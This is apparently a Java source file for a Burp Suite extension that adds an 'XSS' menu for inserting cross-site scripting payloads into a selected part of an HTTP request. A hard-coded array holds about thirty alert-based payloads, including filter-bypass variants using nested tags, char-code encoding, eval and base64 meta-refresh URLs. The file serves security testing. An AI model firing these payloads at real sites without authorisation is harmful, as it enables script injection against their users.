/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenu;
import javax.swing.JMenuItem;

/**
 *
 * @author abdul.wahab
 */
public class XSS_Menu extends JMenu{
    public BurpExtender myburp;
    public String[] XSS_MainMenu = {"Basic", "img", "svg", "html5", "meta tag"};
    public String XSS_MenuItem[][] = {
        {"<script>alert('XSS')</script>", "<scr<script>ipt>alert('XSS')</scr<script>ipt>", "\"><script>alert('XSS')</script>", "\"><script>alert(String.fromCharCode(88,83,83))</script>"},
        {"<img src=x onerror=alert('XSS');>", "<img src=x onerror=alert('XSS')//", "<img src=x onerror=alert(String.fromCharCode(88,83,83));>", "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>", "<img src=x:alert(alt) onerror=eval(src) alt=xss>", "\"><img src=x onerror=alert('XSS');>", "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>"},
        {"<svg onload=alert(1)>", "<svg/onload=alert('XSS')>", "<svg onload=alert(1)//", "<svg/onload=alert(String.fromCharCode(88,83,83))>", "<svg id=alert(1) onload=eval(id)>", "\"><svg/onload=alert(String.fromCharCode(88,83,83))>", "\"><svg/onload=alert(/XSS/)"},
        {"<body onload=alert(/XSS/.source)>", "<input autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>", "<textarea autofocus onfocus=alert(1)>", "<keygen autofocus onfocus=alert(1)>", "<video/poster/onerror=alert(1)>", "<video><source onerror=\"javascript:alert(1)\">", "<video src=_ onloadstart=\"alert(1)\">", "<details/open/ontoggle=\"alert`1`\">", "<audio src onloadstart=alert(1)>", "<marquee onstart=alert(1)>"},
        {"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "<meta/content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"http-equiv=refresh>", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">"}
    };
    
    XSS_Menu(BurpExtender burp){
        this.setText("XSS");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, XSS_MainMenu, XSS_MenuItem, new XXSItemListener(myburp));
    }
}


class XXSItemListener implements ActionListener {

    BurpExtender myburp;
    XXSItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        byte[] param = new byte[selectedIndex[1]-selectedIndex[0]];
        System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1]-selectedIndex[0]);
        String selectString = new String(param);
        String action = e.getActionCommand();
        byte[] newRequest = do_XSS(request, selectString, action, selectedIndex);
        req.setRequest(newRequest);
    }
    
    public byte[] do_XSS(byte[] request, String selectedString, String action, int[] selectedIndex){
        selectedString = action;
        return Methods.do_modify_request(request, selectedIndex, selectedString);
    }
    

}